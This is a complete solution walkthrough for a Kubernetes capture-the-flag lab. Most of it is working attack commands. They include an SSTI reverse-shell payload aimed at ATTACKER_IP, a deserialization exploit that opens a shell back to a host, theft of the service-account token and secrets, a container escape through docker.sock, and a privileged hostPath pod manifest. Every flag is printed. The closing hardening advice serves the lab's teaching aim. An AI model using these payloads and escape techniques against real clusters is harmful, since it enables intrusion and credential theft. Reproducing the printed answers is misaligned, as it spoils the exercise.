# Kubernetes CTF - Complete Solution Walkthrough

This document provides a detailed walkthrough of all attack phases and techniques.

## Prerequisites

Set up your attack environment:

```bash
# Get service URLs
export PYTHON_URL=$(minikube service python-web -n production --url)
export CSHARP_URL=$(minikube service csharp-web -n production --url)

# Set up listener for reverse shells
nc -lvnp 4444
```

---

## Phase 1: Initial Access

### Option A: Python Web App - SSTI Exploitation

**Step 1: Identify the Vulnerability**

Visit the Python web app and test the template rendering functionality:

```bash
curl "$PYTHON_URL/render?template=Hello&name=World"
```

Test for SSTI:

```bash
curl "$PYTHON_URL/render?template={{7*7}}&name=test"
# If you see "49", SSTI is confirmed
```

**Step 2: Enumerate the Environment**

Extract configuration information:

```bash
# Read config
curl "$PYTHON_URL/render?template={{config}}&name=test"

# Access OS module
curl "$PYTHON_URL/render?template={{config.__class__.__init__.__globals__}}&name=test"
```

**Step 3: Establish Reverse Shell**

On your attack machine, start a listener:

```bash
nc -lvnp 4444
```

Execute the SSTI reverse shell payload:

```bash
# Get your IP (minikube host)
export ATTACKER_IP=$(hostname -I | awk '{print $1}')

# Send exploit
./exploits/python-ssti-reverse-shell.sh "$PYTHON_URL" "$ATTACKER_IP" 4444
```

Alternative manual payload:

```bash
PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"").read()}}'
curl -G "$PYTHON_URL/render" --data-urlencode "template=$PAYLOAD" --data-urlencode "name=hacker"
```

---

### Option B: C# Web App - Insecure Deserialization

**Step 1: Identify the Vulnerability**

Check the deserialization endpoint:

```bash
curl "$CSHARP_URL/vulnerable"
```

Response indicates it accepts base64-encoded serialized data.


**Step 2: Execute Exploit**

```bash
# Start listener first
nc -lvnp 4444

# Send payload
python3 csharp-json-exploit-simple.py -u http://192.168.56.102:30081 -c "/bin/bash -i >& /dev/tcp/192.168.56.1/4444 0>&1
```

---

## Phase 2: Container Reconnaissance

Once you have a shell in either container:

**Step 1: Check Environment Variables**

```bash
env
# Look for: FLAG1, POSTGRES_PASSWORD, API_KEY

# Flag found: flag{n3v3r_us3_3nv_f0r_s3cr3ts}
```

**Step 2: Explore Mounted Volumes**

```bash
# Check for mounted secrets
ls -la /app/secrets/
cat /app/secrets/username
cat /app/secrets/password
# Flag found: flag{m0unt3d_s3cr3ts_w1th_wr0ng_p3rm1ss10ns}

# Check ConfigMaps
cat /config/app-config.json
# Flag found: flag{c0nf1gm4ps_ar3nt_f0r_cr3ds}
```

**Step 3: Identify Service Account**

```bash
# Check service account token
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Save for later use
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**Step 4: Check Container Privileges**

```bash
# Check capabilities
cat /proc/self/status | grep Cap

# In C# container - check for privileged mode
id
# Running as root

# Check for docker socket
ls -la /var/run/docker.sock
# If exists, container escape is possible!
```

---

## Phase 3: Kubernetes API Exploitation

**Step 1: Test API Access**

```bash
# Get current namespace
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Test authentication
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces
```

**Step 2: Enumerate Permissions (Python Container)**

The python-web service account has permissions to list secrets:

```bash
# List secrets in production namespace
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/production/secrets

# Get specific secret
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/production/secrets/postgres-credentials

# Decode base64 secret value
# Flag found: flag{s3cr3ts_spr34d_l1k3_w1ldf1r3}
```

**Step 3: Attempt Namespace Discovery**

```bash
# Try to list all namespaces
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces

# Try to access kube-system secrets (will fail from python container)
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
```

---

## Phase 4: Privilege Escalation & Container Escape

### Method 1: Docker Socket Exploitation (C# Container)

The C# container runs privileged with docker.sock mounted - this allows complete container escape.

**Step 1: Install Docker CLI (if not present)**

```bash
# Download docker client
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.9.tgz
tar xzf docker-20.10.9.tgz
cp docker/docker /usr/local/bin/
```

**Step 2: List Containers**

```bash
docker -H unix:///var/run/docker.sock ps
```

**Step 3: Escape to Host**

Method A - Mount host filesystem:

```bash
# Run new privileged container with host filesystem mounted
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host \
  --net=host -v /:/host alpine:latest chroot /host bash

# Now you're on the minikube node!
```

Method B - Access existing container with more privileges:

```bash
# Find the minikube node container or access containerd
ls -la /host/var/lib/minikube/
```

**Step 4: Access kube-system Secrets**

Once on the node, you can access the Kubernetes data directory:

```bash
# Access etcd data or use node's kubelet credentials
export KUBECONFIG=/etc/kubernetes/admin.conf

# Or access secrets directly from disk
find /var/lib/kubelet/ -name "*.yaml" -o -name "secrets"

# Use kubectl (if available on node)
kubectl get secrets -n kube-system crown-jewels -o yaml

# Decode final flag
echo "ZmxhZ3t5MHVfcHduM2RfdGgzX2NsdXN0M3JfYzBuZ3I0dHN9" | base64 -d
# Flag found: flag{y0u_pwn3d_th3_clust3r_c0ngr4ts}
```

### Method 2: Service Account Privilege Escalation

If the python-web service account had additional permissions (like pod create or exec), you could:

```bash
# Create privileged pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: production
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escalate
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "chroot /host && bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Exec into it
kubectl exec -it privesc-pod -n production -- /bin/sh
```

---

## Summary of Flags

1. **flag{n3v3r_us3_3nv_f0r_s3cr3ts}** - Found in environment variables
2. **flag{m0unt3d_s3cr3ts_w1th_wr0ng_p3rm1ss10ns}** - Found in /app/secrets/
3. **flag{c0nf1gm4ps_ar3nt_f0r_cr3ds}** - Found in /config/app-config.json
4. **flag{s3cr3ts_spr34d_l1k3_w1ldf1r3}** - Found via Kubernetes API (postgres-credentials secret)
5. **flag{y0u_pwn3d_th3_clust3r_c0ngr4ts}** - Found in kube-system namespace (crown-jewels secret)

---

## Vulnerabilities Exploited

### Application Level
1. **Server-Side Template Injection (SSTI)** - Python Flask app allows arbitrary code execution
2. **Insecure Deserialization** - C# app uses BinaryFormatter without validation

### Kubernetes Misconfigurations
1. **Secrets in Environment Variables** - Easy to extract, logged in many places
2. **Mounted Secrets with Wrong Permissions (0777)** - Should be read-only 0400
3. **Secrets in ConfigMaps** - ConfigMaps are not encrypted at rest
4. **Overprivileged Service Account** - python-web-sa can list secrets
5. **Privileged Container** - C# container runs with privileged: true
6. **Docker Socket Mounted** - Allows complete container escape
7. **Running as Root** - Both containers run as UID 0
8. **No Network Policies** - Unrestricted network access between pods
9. **No Pod Security Standards** - No admission control preventing dangerous configurations

---

## Security Recommendations

### Application Security
- Never use user input directly in template rendering
- Avoid BinaryFormatter and insecure deserialization
- Implement input validation and sanitization
- Use secure serialization formats (JSON)

### Kubernetes Security
1. **Secrets Management**
   - Never put secrets in environment variables or ConfigMaps
   - Use proper secrets management (Vault, External Secrets)
   - Mount secrets read-only with 0400 permissions
   - Rotate secrets regularly

2. **RBAC & Service Accounts**
   - Apply principle of least privilege
   - Don't use default service account
   - Limit secrets access to only what's needed
   - Regularly audit RBAC permissions

3. **Pod Security**
   - Never run privileged containers
   - Never mount docker.sock
   - Use non-root users (runAsNonRoot: true)
   - Drop all capabilities
   - Use read-only root filesystem
   - Apply Pod Security Standards (restricted)

4. **Network Security**
   - Implement network policies (default deny)
   - Segment namespaces
   - Restrict egress traffic
   - Use service mesh for mTLS

5. **Monitoring & Detection**
   - Enable audit logging
   - Monitor for privilege escalation attempts
   - Alert on secret access patterns
   - Use runtime security tools (Falco)

---

## Tools Used

- **curl** - HTTP client for exploitation
- **netcat** - Reverse shell listener
- **ysoserial** - .NET deserialization payload generator
- **kubectl** - Kubernetes CLI
- **docker** - Container escape via socket
- **base64** - Decoding secrets

---

## Additional Resources

- [OWASP Top 10 Kubernetes](https://owasp.org/www-project-kubernetes-top-ten/)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [NSA/CISA Kubernetes Hardening Guide](https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/)
